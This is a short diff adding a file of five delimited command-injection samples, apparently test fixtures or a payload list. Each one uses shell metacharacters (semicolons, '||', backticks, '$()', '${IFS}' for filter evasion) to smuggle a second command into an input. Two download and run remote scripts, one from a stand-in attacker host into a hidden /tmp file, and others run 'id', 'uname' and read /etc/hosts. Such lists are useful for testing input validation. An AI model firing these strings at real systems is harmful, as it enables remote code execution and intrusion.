@@ -1,0 +1,10 @@
+<<<SAMPLE>>>
+; curl -fsSL https://cdn.example.net/setup.sh | bash
+<<<SAMPLE>>>
+|| wget --quiet https://evil.example/x -O /tmp/.cfg && /bin/sh /tmp/.cfg
+<<<SAMPLE>>>
+`id -u`
+<<<SAMPLE>>>
+$(uname -srvm)
+<<<SAMPLE>>>
+;${IFS}cat${IFS}/etc/hosts
